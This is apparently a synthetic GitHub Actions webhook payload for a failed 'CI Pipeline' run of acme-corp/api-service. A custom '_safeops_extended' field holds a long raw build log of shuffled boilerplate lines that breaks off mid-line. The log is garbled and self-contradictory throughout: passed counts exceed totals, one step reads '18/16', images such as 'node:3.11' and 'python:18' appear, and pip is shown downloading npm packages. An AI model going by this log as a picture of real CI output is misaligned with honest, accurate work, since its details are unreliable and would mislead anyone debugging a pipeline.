{
  "action": "completed",
  "workflow_run": {
    "id": 444,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "cfe2a8b850af8ebe916bbdcdd832ed07833948f3",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-18T12:46:48.625199Z",
    "updated_at": "2025-12-18T12:50:23.660890Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: save_cache ===\n\u2713 Task completed in 840ms\n[12:46:48] DEBUG: Initializing service\nCreating production build...\nVerifying...\nnpm notice: created a lockfile\nFetching submodules...\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 8/17: Building\nCache invalidated: build\n  PASS: test_db_connect (460ms)\nPlatform: win32-x64\nBundling vendor.css\nCache restored successfully (188MB)\nOK\nImage pulled successfully\nCompiling lib/index.js...\nyarn add: Done in 12.50s\nnpm notice: created a lockfile\nPulling image: node:18\nArtifact uploaded: dist.zip (4MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: jest has known vulnerabilities\nFetching from https://npmjs.org/package.json\nLayer 2/11: RUN command\nGenerating source maps...\nNODE_ENV=production\nCreating production build...\nCompiling lib/service.java...\nOK\nnpm notice: package.json updated\nnpm notice: package.json updated\nLoading...\n[12:46:48] INFO: Starting build process\npip: Collecting webpack\nArtifact uploaded: build.tar.gz (20MB)\nTLS handshake completed\nArtifact uploaded: build.tar.gz (49MB)\nCache miss for key-2456\nProcessing...\nWARNING: lodash has known vulnerabilities\npip: Downloading react-1.15.tar.gz\nnpm notice: created a lockfile\n[12:46:48] INFO: Processing request\nGenerating source maps...\nTest Suites: 42 passed, 39 total\nOptimizing 91 modules...\nUsing Node.js 15.15.1\nPOST /data - 200 (178ms)\nDone.\nFetching submodules...\n  PASS: e2e/test_user_create.spec.js\n[12:46:48] INFO: Starting build process\n[12:46:48] INFO: Starting build process\nPulling image: alpine:3.11\n[12:46:48] DEBUG: Memory usage: 1772MB\n[12:46:48] INFO: Starting build process\nBundling main.js\nProcessing...\nSwitched to branch 'hotfix/task-779'\npip: Downloading jest-3.6.tar.gz\nStep 13/25: Running migrations\nStep 20/20: Running migrations\nReady.\nCompiling components/app.ts...\nConnection established\nCache hit for key-2052\nnpm install: resolved 1837 packages\nPulling image: python:18\n\u2713 All checks passed\nException: NullPointerException\nWaiting...\nNODE_ENV=test\nCoverage: 70% statements, 85% branches\nUsing Node.js 14.11.3\nException: ValueError\nArtifact uploaded: dist.zip (90MB)\nPOST /data - 201 (47ms)\n[12:46:48] DEBUG: Query executed in 37ms\nStep 7/15: Testing\nArtifact uploaded: dist.zip (50MB)\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nProcessing...\n[12:46:48] WARN: Deprecated API usage\npip: Collecting jest\nTest Suites: 34 passed, 15 total\n\u2713 All checks passed\nLoading...\npip install: Successfully installed webpack-5.8\n[12:46:48] ERROR: Connection failed\n[12:46:48] WARN: Deprecated API usage\n\u2713 Step 'install' succeeded\nNODE_ENV=test\nStep 16/24: Linting\nFetching submodules...\npip: Downloading eslint-4.5.tar.gz\npip: Downloading prettier-4.8.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\nMinifying vendor.js\nSwitched to branch 'hotfix/task-882'\nStep 12/22: Running migrations\nStep 5/20: Building\nStep 5/19: Building\nPushing to registry...\n[12:46:48] WARN: Deprecated API usage\nUsing Node.js 18.15.3\n\u2713 Step 'test' succeeded\nWARNING: prettier has known vulnerabilities\nCache saved successfully\nVerifying...\n\u2713 All checks passed\n[12:46:48] INFO: Starting build process\nProcessing...\nEnvironment: development\n[12:46:48] WARN: Deprecated API usage\nStep 18/23: Running migrations\n[12:46:48] WARN: Deprecated API usage\n  PASS: integration/test_user_create.spec.js\nNODE_ENV=development\n[12:46:48] DEBUG: Memory usage: 1401MB\nLoading...\n\u2713 Task completed in 3212ms\n[12:46:48] INFO: Starting build process\nConnection established\n\u2713 Step 'checkout' succeeded\nHEAD is now at 9810a30\nTime: 86.422s\nTests: 433 passed, 472 total\n[12:46:48] DEBUG: Query executed in 52ms\nLoading...\nEnvironment: test\nLoading...\nNODE_ENV=test\n[12:46:48] DEBUG: Query executed in 80ms\nTests: 173 passed, 54 total\nRan 146 tests in 37s\nImage pulled successfully\nArtifact downloaded: 31MB\nCompiling lib/utils.go...\npip: Collecting axios\nTLS handshake completed\nWaiting...\nStep 16/24: Installing dependencies\nCreating production build...\nPlatform: linux-x64\nBundling styles.css\nTransforming 437 files...\nStep 16/24: Installing dependencies\nOK\nWaiting...\nInstalling react@2.2.9\n  PASS: unit/test_user_create.spec.js\n\u2713 Step 'build' succeeded\nTests: 346 passed, 495 total\nUploading artifact 'dist' (6 files)\nnpm notice: created a lockfile\nFinished.\n[12:46:48] WARN: Deprecated API usage\n\u2713 deploy completed\nPOST /api - 201 (212ms)\nCache hit for key-6014\nFAILED: test_user_create\nSnapshots: 32 passed, 7 total\n[12:46:48] DEBUG: Initializing service\n=== Step save_cache completed ===\n=== Step: lint ===\nPulling image: node:3.11\nException: TypeError\nWaiting...\nCache hit for key-4842\nStep 13/24: Running migrations\nAlready up to date.\nProcessing...\npip: Downloading express-1.0.tar.gz\n\u2713 validate completed\nStep 15/25: Linting\n[12:46:48] WARN: Deprecated API usage\nCompiling utils/service.java...\nPOST /api - 200 (175ms)\nUsing Python 3.9\nOK\nStep 9/16: Building\n\u2713 Step 'build' succeeded\nCompiling lib/main.py...\nnpm notice: created a lockfile\nSnapshots: 25 passed, 7 total\n[12:46:48] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:48] ERROR: Connection failed\n[12:46:48] DEBUG: Initializing service\n\u2713 test completed\nStep 8/20: Linting\nCompiling utils/main.py...\n[12:46:48] WARN: Deprecated API usage\nRan 60 tests in 22s\nUploading artifact 'coverage' (17 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: node_modules\nArtifact downloaded: 38MB\nUsing Python 3.10\nLayer 5/13: RUN command\nTLS handshake completed\nWaiting...\nFAILED: test_auth_login\nUsing Python 3.10\npip install: Successfully installed lodash-1.7\n\u2717 build failed with exit code 35\nWARNING: express has known vulnerabilities\n[12:46:48] DEBUG: Loading configuration\n\u2713 All checks passed\nReady.\nCompiling lib/app.ts...\nUsing Node.js 18.10.1\nStep 17/21: Linting\nReady.\nyarn add: Done in 29.22s\nGenerating source maps...\nnpm notice: package.json updated\n[12:46:48] INFO: Processing request\n[12:46:48] WARN: Deprecated API usage\n[12:46:48] INFO: Processing request\nFAILED: test_db_connect\n\u2713 build completed\n[12:46:48] WARN: Deprecated API usage\n\u2713 lint completed\nnpm install: resolved 1863 packages\nOptimizing 38 modules...\nStep 4/15: Running migrations\nTransforming 221 files...\n[12:46:48] DEBUG: Initializing service\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: created a lockfile\nCompiling lib/utils.go...\nStep 5/25: Deploying\nCreating production build...\nOK\n\u2713 All checks passed\n\u2717 build failed with exit code 118\nCache invalidated: build\nUsing Node.js 16.11.10\nException: RuntimeError\nAlready up to date.\nTransforming 282 files...\nUsing Python 3.12\nOptimizing 63 modules...\nConnection established\n\u2713 All checks passed\nGenerating source maps...\nSnapshots: 34 passed, 6 total\nCompiling src/main.py...\nnpm notice: package.json updated\nSnapshots: 8 passed, 21 total\nSuccess!\nCompiling lib/index.js...\n[12:46:48] DEBUG: Connection pool: 17 active\nOptimizing 92 modules...\nCache invalidated: node_modules\nTime: 67.632s\nWARNING: axios has known vulnerabilities\nStep 18/21: Deploying\nSnapshots: 33 passed, 41 total\nChecking out main branch\nCache miss for key-7599\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nMinifying app.js\nCache hit for key-2360\nTransforming 658 files...\nFAILED: test_user_create\nCache saved successfully\nCompleted.\nHEAD is now at d8fe88e\nLoading...\nAlready up to date.\n\u2713 Task completed in 2650ms\nGenerating source maps...\n[12:46:48] DEBUG: Initializing service\nLayer 8/14: RUN command\nVerifying...\npip: Collecting express\n  PASS: test_cache_hit (152ms)\n[12:46:48] DEBUG: Loading configuration\nTransforming 378 files...\nArtifact uploaded: build.tar.gz (13MB)\nPlatform: linux-x64\n\u2713 lint completed\nTest Suites: 31 passed, 16 total\nnpm notice: created a lockfile\nOptimizing 96 modules...\nWARNING: lodash has known vulnerabilities\n[12:46:48] DEBUG: Memory usage: 212MB\nOK\npip: Collecting jest\nSwitched to branch 'feature/task-600'\n\u2713 Task completed in 4131ms\nArtifact uploaded: dist.zip (8MB)\n[12:46:48] INFO: Request completed\nCompiling utils/utils.go...\n[12:46:48] DEBUG: Initializing service\nStep 9/19: Testing\n[12:46:48] DEBUG: Initializing service\nWaiting...\n  PASS: test_api_health (10ms)\nCompiling lib/service.java...\nVerifying...\n[12:46:48] INFO: Request completed\n[12:46:48] WARN: Deprecated API usage\nFetching submodules...\n  PASS: unit/test_api_health.spec.js\nCache invalidated: build\n[12:46:48] DEBUG: Connection pool: 11 active\nImage pulled successfully\nPulling image: alpine:latest\nStep 5/16: Deploying\n[12:46:48] WARN: Deprecated API usage\nProcessing...\nTransforming 916 files...\nOK\nyarn add: Done in 25.98s\nUsing Node.js 15.8.5\nArtifact uploaded: dist.zip (7MB)\nGenerating source maps...\n[12:46:48] DEBUG: Loading configuration\n\u2713 Step 'test' succeeded\nStep 13/21: Linting\nnpm notice: package.json updated\nCache saved successfully\n[12:46:48] DEBUG: Query executed in 73ms\nWARNING: react has known vulnerabilities\n[12:46:48] DEBUG: Initializing service\n[12:46:48] INFO: Connecting to database\n[12:46:48] INFO: Starting build process\n=== Step lint completed ===\n=== Step: install_dependencies ===\n[12:46:48] INFO: Cache refreshed\nWaiting...\nBuilding Docker image...\nGenerating source maps...\nPulling image: python:3.11\nArtifact uploaded: build.tar.gz (13MB)\nnpm notice: created a lockfile\nCreating production build...\npip install: Successfully installed eslint-5.5\npip install: Successfully installed prettier-2.6\nVerifying...\nFinished.\nArtifact downloaded: 2MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBundling main.js\nArtifact downloaded: 19MB\nnpm notice: created a lockfile\nFetching from https://docker.io/package.json\nCompiling lib/utils.go...\nArtifact uploaded: build.tar.gz (37MB)\n[12:46:48] INFO: Starting build process\nLayer 9/11: RUN command\n\u2717 build failed with exit code 111\nWaiting...\nConnection established\n[12:46:48] ERROR: Connection failed\nLoading...\n\u2713 Task completed in 3887ms\nHEAD is now at 816f34e\n[12:46:48] DEBUG: Query executed in 27ms\nStep 12/23: Deploying\nGenerating source maps...\nGET /api - 200 (17ms)\nFinished.\nTLS handshake completed\nnpm install: resolved 267 packages\n[12:46:48] DEBUG: Memory usage: 867MB\nMinifying main.js\nCompiling src/service.java...\nnpm notice: package.json updated\nOK\nnpm install: resolved 777 packages\nPulling image: node:3.11\npip: Downloading webpack-4.3.tar.gz\n[12:46:48] INFO: Connecting to database\nTransforming 806 files...\nNODE_ENV=production\nNODE_ENV=test\n\u2713 deploy completed\n\u2713 All checks passed\n[12:46:48] INFO: Starting build process\nPOST /upload - 202 (417ms)\nAlready up to date.\nCoverage: 74% statements, 77% branches\n[12:46:48] INFO: Processing request\nTime: 89.506s\n[12:46:48] DEBUG: Loading configuration\n\u2713 Task completed in 395ms\nCache invalidated: build\n[12:46:48] ERROR: Connection failed\nFetching from https://googleapis.com/package.json\nnpm notice: package.json updated\nFetching submodules...\nNODE_ENV=test\nHEAD is now at 80f5f92\nLoading...\nTest Suites: 21 passed, 16 total\nArtifact uploaded: build.tar.gz (2MB)\nCreating production build...\nSnapshots: 0 passed, 13 total\n[12:46:48] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompleted.\npip: Installing build dependencies...\nSuccess!\nStep 11/22: Deploying\n\u2717 build failed with exit code 74\nCreating production build...\nTests: 196 passed, 476 total\nWARNING: eslint has known vulnerabilities\nWARNING: axios has known vulnerabilities\nAlready up to date.\nHEAD is now at 17a24ce\nPlatform: linux-x64\nDone.\nCache hit for key-8982\nFetching submodules...\npip: Downloading express-2.19.tar.gz\nCoverage: 88% statements, 87% branches\nStep 7/15: Linting\nnpm notice: created a lockfile\nCoverage: 94% statements, 79% branches\nFAILED: test_db_connect\nAlready up to date.\nRan 98 tests in 56s\nUploading artifact 'coverage' (50 files)\nStep 2/16: Testing\n\u2713 Step 'checkout' succeeded\nCoverage: 92% statements, 98% branches\nOK\n[12:46:48] DEBUG: Connection pool: 17 active\nBuilding Docker image...\nnpm install: added 491 packages\n[12:46:48] DEBUG: Initializing service\nLayer 10/10: ENV command\nGenerating source maps...\nReady.\n[12:46:48] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\nSuccess!\nStep 9/21: Testing\nWARNING: axios has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache invalidated: node_modules\nUploading artifact 'build' (49 files)\nArtifact downloaded: 6MB\nStep 11/17: Linting\nSuccess!\npip: Collecting axios\n[12:46:48] WARN: Deprecated API usage\nnpm notice: created a lockfile\n\u2717 build failed with exit code 49\n[12:46:48] INFO: Starting build process\nWaiting...\n[12:46:48] INFO: Starting build process\nCache invalidated: build\nTests: 323 passed, 299 total\n[12:46:48] DEBUG: Query executed in 80ms\n[12:46:48] DEBUG: Connection pool: 17 active\nHEAD is now at de268d7\nMinifying vendor.js\n[12:46:48] WARN: Deprecated API usage\n[12:46:48] DEBUG: Memory usage: 726MB\nTLS handshake completed\nCache restored successfully (299MB)\nStep 17/20: Deploying\nCompiling lib/app.ts...\nLayer 8/13: COPY command\npip: Downloading eslint-5.0.tar.gz\nGET /status - 204 (97ms)\nInstalling react@1.3.2\nArtifact uploaded: dist.zip (9MB)\nArtifact uploaded: build.tar.gz (50MB)\nFetching submodules...\nBundling runtime.js\nUsing Python 3.9\nCache miss for key-5350\nRan 52 tests in 54s\npip install: Successfully installed express-4.5\n[12:46:48] DEBUG: Initializing service\nnpm notice: created a lockfile\nCache hit for key-7136\nArtifact uploaded: dist.zip (45MB)\nHEAD is now at 1e2d451\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCoverage: 99% statements, 69% branches\nGenerating source maps...\nHEAD is now at dde4b54\n  PASS: test_db_connect (462ms)\nGET /api - 204 (32ms)\nCompiling components/app.ts...\n[12:46:48] INFO: Request completed\nnpm install: resolved 1703 packages\nUsing Python 3.12\nCompiling lib/handler.rs...\nDone.\n=== Step install_dependencies completed ===\n=== Step: checkout ===\nCache invalidated: node_modules\nCache hit for key-1727\nCache hit for key-1958\nFetching submodules...\nWARNING: eslint has known vulnerabilities\nCoverage: 81% statements, 98% branches\npip: Collecting express\nCache invalidated: node_modules\n[12:46:48] INFO: Connecting to database\nGET /api - 201 (64ms)\nnpm install: added 389 packages\nUploading artifact 'dist' (47 files)\n[12:46:48] INFO: Processing request\nLayer 4/10: RUN command\nFinished.\nPushing to registry...\nVerifying...\nWARNING: axios has known vulnerabilities\n[12:46:48] ERROR: Connection failed\nPulling image: alpine:latest\nSwitched to branch 'hotfix/task-602'\nCache saved successfully\nCache restored successfully (230MB)\nException: RuntimeError\nArtifact uploaded: build.tar.gz (49MB)\nVerifying...\nWaiting...\nTransforming 683 files...\nSuccess!\nnpm notice: package.json updated\n[12:46:48] WARN: Deprecated API usage\nArtifact downloaded: 45MB\nLoading...\nStep 2/25: Deploying\nnpm install: resolved 664 packages\nnpm install: resolved 1756 packages\nGET /health - 200 (20ms)\nFinished.\npip: Installing build dependencies...\n\u2713 All checks passed\nLayer 3/9: RUN command\n  PASS: e2e/test_db_connect.spec.js\npip: Collecting prettier\n  PASS: integration/test_db_connect.spec.js\nSuccess!\n[12:46:48] DEBUG: Loading configuration\nImage pulled successfully\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nNODE_ENV=development\nHEAD is now at 1d1836e\nAlready up to date.\nWARNING: eslint has known vulnerabilities\nNODE_ENV=development\nAlready up to date.\n[12:46:48] WARN: Deprecated API usage\nFinished.\nSnapshots: 32 passed, 36 total\nChecking out main branch\nAlready up to date.\n\u2713 Task completed in 2947ms\nnpm notice: package.json updated\nOK\nUsing Node.js 20.3.10\n[12:46:48] WARN: Deprecated API usage\nCompiling components/handler.rs...\nCompiling src/handler.rs...\n\u2713 All checks passed\n[12:46:48] DEBUG: Query executed in 99ms\nBundling runtime.js\nTransforming 566 files...\nMinifying vendor.js\nStep 8/22: Linting\nVerifying...\nCompleted.\nOptimizing 12 modules...\nStep 11/22: Linting\nNODE_ENV=test\nCompleted.\nWARNING: prettier has known vulnerabilities\n\u2713 Task completed in 2431ms\nHEAD is now at d8a69a3\nVerifying...\nTests: 352 passed, 169 total\nLoading...\n[12:46:48] DEBUG: Initializing service\n\u2713 Step 'setup' succeeded\nyarn add: Done in 9.2s\n\u2717 build failed with exit code 91\nCompiling lib/handler.rs...\nOK\nCompiling utils/utils.go...\nVerifying...\nCoverage: 83% statements, 87% branches\nPushing to registry...\nStep 15/17: Installing dependencies\nTime: 36.278s\nStep 1/21: Linting\npip: Downloading prettier-5.6.tar.gz\nFetching submodules...\n[12:46:48] DEBUG: Connection pool: 3 active\nCache hit for key-1732\nnpm install: resolved 894 packages\n[12:46:48] DEBUG: Loading configuration\nLoading...\nnpm notice: created a lockfile\nSuccess!\nCache restored successfully (288MB)\nFAILED: test_db_connect\nStep 9/17: Testing\nTests: 176 passed, 224 total\nInstalling lodash@1.18.10\n[12:46:48] WARN: Deprecated API usage\nSnapshots: 13 passed, 2 total\nLoading...\nCompiling utils/main.py...\n\u2713 All checks passed\nVerifying...\npip: Collecting webpack\n  PASS: test_api_health (309ms)\nGET /api - 201 (86ms)\npip: Collecting eslint\nCache invalidated: build\nUsing Node.js 17.14.10\nnpm install: resolved 1192 packages\nCompleted.\nLayer 10/11: ENV command\nCache miss for key-8194\nUsing Node.js 16.9.4\nChecking out develop branch\nCompiling components/handler.rs...\nSuccess!\nnpm notice: package.json updated\nHEAD is now at db79efd\nStep 9/15: Building\nConnection established\nAlready up to date.\nUploading artifact 'dist' (38 files)\npip install: Successfully installed webpack-4.15\n[12:46:48] DEBUG: Initializing service\nVerifying...\n\u2713 Task completed in 1051ms\nStep 10/22: Building\nCache restored successfully (457MB)\nBundling runtime.css\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nNODE_ENV=development\nWaiting...\nCreating production build...\nFinished.\nStep 10/16: Installing dependencies\nStep 4/18: Installing dependencies\nGET /api - 200 (65ms)\n\u2713 Task completed in 1689ms\nWaiting...\nEnvironment: development\nWaiting...\nUploading artifact 'build' (24 files)\nTime: 28.673s\nCache restored successfully (385MB)\nFAILED: test_auth_login\nRan 152 tests in 7s\n\u2713 All checks passed\nEnvironment: development\n\u2713 Step 'test' succeeded\nFetching from https://github.com/package.json\n=== Step checkout completed ===\n=== Step: setup_environment ===\nAlready up to date.\n[12:46:48] WARN: Deprecated API usage\n[12:46:48] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:48] ERROR: Connection failed\nFinished.\n\u2713 test completed\nPOST /upload - 201 (132ms)\n[12:46:48] DEBUG: Memory usage: 1818MB\nTransforming 536 files...\nCreating production build...\n[12:46:48] INFO: Processing request\n[12:46:48] INFO: Request completed\nArtifact uploaded: build.tar.gz (41MB)\nNODE_ENV=test\nCache saved successfully\nCompiling src/main.py...\nnpm notice: package.json updated\n\u2713 package completed\nOptimizing 43 modules...\nBundling vendor.css\npip: Downloading react-3.11.tar.gz\nyarn add: Done in 10.62s\npip: Downloading lodash-4.11.tar.gz\nVerifying...\nSuccess!\n[12:46:48] INFO: Processing request\nTLS handshake completed\nOK\npip: Collecting axios\nProcessing...\nCache saved successfully\nFetching submodules...\n[12:46:48] INFO: Request completed\n\u2713 Step 'test' succeeded\nWARNING: axios has known vulnerabilities\nCompiling src/utils.go...\nCache restored successfully (313MB)\n\u2713 Step 'setup' succeeded\n[12:46:48] DEBUG: Query executed in 55ms\nTransforming 152 files...\nnpm notice: package.json updated\n[12:46:48] DEBUG: Memory usage: 1136MB\nCompiling utils/index.js...\n[12:46:48] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (16MB)\nDone.\nStep 5/18: Testing\nCache invalidated: node_modules\n[12:46:48] ERROR: Connection failed\n[12:46:48] DEBUG: Initializing service\nReady.\nCompleted.\n[12:46:48] DEBUG: Loading configuration\nTests: 314 passed, 149 total\nPulling image: python:3.11\n  PASS: unit/test_user_create.spec.js\nPulling image: python:3.11\n\u2713 Task completed in 2994ms\nStep 6/21: Building\n  PASS: test_auth_login (328ms)\nImage pulled successfully\nnpm install: added 129 packages\nnpm notice: package.json updated\nStep 8/16: Linting\n[12:46:48] ERROR: Connection failed\nChecking out develop branch\nCache miss for key-3135\nnpm notice: created a lockfile\n\u2713 deploy completed\nCreating production build...\n[12:46:48] DEBUG: Initializing service\nPlatform: win32-x64\nPOST /api - 201 (164ms)\nProcessing...\nBuilding Docker image...\n\u2713 Step 'install' succeeded\n  PASS: test_db_connect (67ms)\nWARNING: lodash has known vulnerabilities\n[12:46:48] INFO: Starting build process\nCache saved successfully\nCache restored successfully (265MB)\nImage pulled successfully\nSuccess!\nStep 4/17: Testing\nPushing to registry...\nCompiling src/index.js...\nCompiling components/handler.rs...\nWaiting...\n  PASS: unit/test_auth_login.spec.js\nStep 1/19: Building\nSuccess!\nOptimizing 68 modules...\nPulling image: python:latest\nWARNING: eslint has known vulnerabilities\nCompiling utils/utils.go...\nImage pulled successfully\nUploading artifact 'coverage' (43 files)\nFAILED: test_db_connect\nDone.\nnpm notice: created a lockfile\n[12:46:48] ERROR: Connection failed\nBuilding Docker image...\nSuccess!\nOptimizing 77 modules...\nUsing Python 3.10\nArtifact downloaded: 50MB\n  PASS: integration/test_user_create.spec.js\nVerifying...\n[12:46:48] INFO: Processing request\nCache miss for key-2053\nBuilding Docker image...\n  PASS: e2e/test_auth_login.spec.js\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBuilding Docker image...\n[12:46:48] WARN: Deprecated API usage\n\u2713 All checks passed\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: package.json updated\nPulling image: python:3.11\nCoverage: 86% statements, 100% branches\npip install: Successfully installed jest-5.16\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:48] DEBUG: Query executed in 80ms\nnpm install: added 283 packages\n[12:46:48] INFO: Connecting to database\n[12:46:48] DEBUG: Loading configuration\nGET /status - 204 (48ms)\nVerifying...\nyarn add: Done in 3.88s\nAlready up to date.\nEnvironment: development\nLoading...\nProcessing...\n[12:46:48] DEBUG: Loading configuration\nStep 18/19: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:48] DEBUG: Connection pool: 17 active\nCompiling lib/handler.rs...\npip: Installing build dependencies...\nFetching from https://npmjs.org/package.json\nNODE_ENV=development\nConnection established\nAlready up to date.\nLoading...\nDone.\n[12:46:48] DEBUG: Query executed in 54ms\nChecking out master branch\nTest Suites: 8 passed, 38 total\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (11MB)\nFinished.\n[12:46:48] DEBUG: Query executed in 61ms\nHEAD is now at da064a1\nBundling main.css\nCompleted.\nChecking out main branch\nStep 12/24: Deploying\nnpm notice: created a lockfile\nUsing Python 3.9\nPushing to registry...\nCreating production build...\nFetching from https://registry.npmjs.org/package.json\n=== Step setup_environment completed ===\n=== Step: deploy_production ===\nAlready up to date.\n\u2713 Step 'setup' succeeded\nMinifying vendor.js\nEnvironment: development\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 10/20: Running migrations\nRan 86 tests in 41s\nnpm install: resolved 1707 packages\n\u2713 Step 'build' succeeded\nDone.\nSuccess!\nCache miss for key-9088\nChecking out develop branch\nConnection established\n[12:46:48] INFO: Connecting to database\nPlatform: win32-x64\nTests: 410 passed, 399 total\nGenerating source maps...\n[12:46:48] INFO: Request completed\nCompiling src/index.js...\npip: Downloading jest-4.9.tar.gz\nException: RuntimeError\nInstalling lodash@1.2.10\nOK\nStep 3/20: Linting\nArtifact downloaded: 24MB\n[12:46:48] INFO: Starting build process\nHEAD is now at 0035781\nRan 49 tests in 57s\nStep 18/16: Deploying\nCoverage: 90% statements, 67% branches\nCreating production build...\nWARNING: webpack has known vulnerabilities\n[12:46:48] INFO: Request completed\npip: Collecting axios\n\u2713 All checks passed\n  PASS: e2e/test_api_health.spec.js\n[12:46:48] DEBUG: Connection pool: 4 active\nUsing Python 3.12\nRan 160 tests in 40s\nBundling vendor.js\nWaiting...\n\u2713 test completed\n[12:46:48] DEBUG: Loading configuration\n[12:46:48] ERROR: Connection failed\n[12:46:48] ERROR: Connection failed\nUploading artifact 'build' (24 files)\nCache invalidated: dependencies\nArtifact uploaded: dist.zip (7MB)\nUsing Python 3.9\n[12:46:48] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\n[12:46:48] DEBUG: Memory usage: 1480MB\nWARNING: webpack has known vulnerabilities\nCache miss for key-1395\nWARNING: axios has known vulnerabilities\nPushing to registry...\nSnapshots: 46 passed, 49 total\n[12:46:48] INFO: Starting build process\nCache saved successfully\nWARNING: prettier has known vulnerabilities\nCompleted.\nEnvironment: staging\nVerifying...\nnpm install: added 379 packages\nFetching from https://gcr.io/package.json\n\u2713 Task completed in 2464ms\nEnvironment: test\nWARNING: prettier has known vulnerabilities\nFetching from https://googleapis.com/package.json\nEnvironment: test\nStep 18/24: Running migrations\nFetching submodules...\nnpm notice: created a lockfile\nBundling main.js\n[12:46:48] WARN: Deprecated API usage\nPOST /data - 200 (124ms)\nnpm install: resolved 1931 packages\nTLS handshake completed\nEnvironment: development\nSuccess!\npip: Collecting express\nFetching submodules...\nUsing Node.js 15.2.4\nAlready up to date.\nWaiting...\nInstalling eslint@3.7.9\nInstalling prettier@1.14.8\nCompiling utils/handler.rs...\nConnection established\nSuccess!\n[12:46:48] INFO: Connecting to database\nAlready up to date.\nReady.\nReady.\nyarn add: Done in 9.19s\nUsing Node.js 19.2.1\nBundling main.css\n[12:46:48] DEBUG: Query executed in 33ms\nChecking out master branch\nStep 6/15: Installing dependencies\n\u2717 build failed with exit code 89\nnpm install: resolved 1014 packages\nEnvironment: production\nWARNING: webpack has known vulnerabilities\nStep 19/22: Testing\nChecking out develop branch\nCache restored successfully (476MB)\nGenerating source maps...\nTest Suites: 43 passed, 39 total\nSwitched to branch 'hotfix/task-913'\nWARNING: eslint has known vulnerabilities\nTransforming 609 files...\nnpm install: resolved 1884 packages\nStep 15/19: Installing dependencies\nUsing Python 3.9\nyarn add: Done in 24.95s\nWARNING: express has known vulnerabilities\nGenerating source maps...\nArtifact uploaded: dist.zip (58MB)\nInstalling express@3.11.1\n[12:46:48] DEBUG: Loading configuration\nProcessing...\nGET /api - 200 (68ms)\nMinifying app.js\nTime: 100.66s\nGenerating source maps...\nFetching from https://github.com/package.json\nOK\nnpm notice: created a lockfile\n[12:46:48] WARN: Deprecated API usage\nnpm install: resolved 1783 packages\nCompleted.\nMinifying vendor.js\n[12:46:48] WARN: Deprecated API usage\nCache invalidated: node_modules\nStep 3/15: Linting\n[12:46:48] WARN: Deprecated API usage\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\nStep 3/21: Installing dependencies\nTime: 68.702s\nBundling runtime.css\nWARNING: jest has known vulnerabilities\npip: Collecting express\nTransforming 708 files...\nPulling image: python:latest\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 All checks passed\nCache miss for key-5025\n  PASS: e2e/test_user_create.spec.js\nRan 83 tests in 6s\npip: Collecting webpack\n[12:46:48] DEBUG: Connection pool: 5 active\n\u2713 All checks passed\nCompiling components/main.py...\n[12:46:48] ERROR: Connection failed\nImage pulled successfully\nPlatform: darwin-arm64\nCompiling lib/handler.rs...\nConnection established\nGenerating source maps...\n\u2713 Task completed in 4823ms\nStep 12/22: Testing\npip: Downloading eslint-3.1.tar.gz\nOK\n=== Step deploy_production completed ===\n=== Step: upload_artifacts ===\nBuilding Docker image...\n[12:46:48] DEBUG: Memory usage: 617MB\nDone.\nSuccess!\nPOST /data - 202 (438ms)\n[12:46:48] INFO: Cache refreshed\nSnapshots: 25 passed, 27 total\nLoading...\nArtifact uploaded: dist.zip (26MB)\n[12:46:48] DEBUG: Query executed in 69ms\nCache invalidated: dependencies\nyarn add: Done in 21.60s\nLayer 5/10: RUN command\npip install: Successfully installed react-5.12\n[12:46:48] DEBUG: Query executed in 65ms\n[12:46:48] INFO: Request completed\nCache restored successfully (167MB)\n  PASS: test_auth_login (15ms)\nLayer 5/14: RUN command\n[12:46:48] DEBUG: Memory usage: 738MB\nCompiling components/index.js...\n[12:46:48] WARN: Deprecated API usage\nCreating production build...\nStep 10/16: Running migrations\nFAILED: test_db_connect\nCoverage: 89% statements, 93% branches\n[12:46:48] INFO: Connecting to database\nChecking out main branch\nArtifact downloaded: 17MB\nConnection established\nPOST /data - 201 (344ms)\nReady.\nTest Suites: 36 passed, 21 total\nVerifying...\npip install: Successfully installed react-5.9\nFetching from https://gcr.io/package.json\nPushing to registry...\nCache miss for key-7260\nCache hit for key-2789\npip: Collecting axios\nTest Suites: 30 passed, 44 total\nRan 195 tests in 15s\nLoading...\nCompiling utils/service.java...\nGET /api - 200 (19ms)\n  PASS: e2e/test_auth_login.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling utils/handler.rs...\nnpm notice: created a lockfile\n[12:46:48] DEBUG: Query executed in 18ms\nWaiting...\nCache hit for key-3270\nInstalling 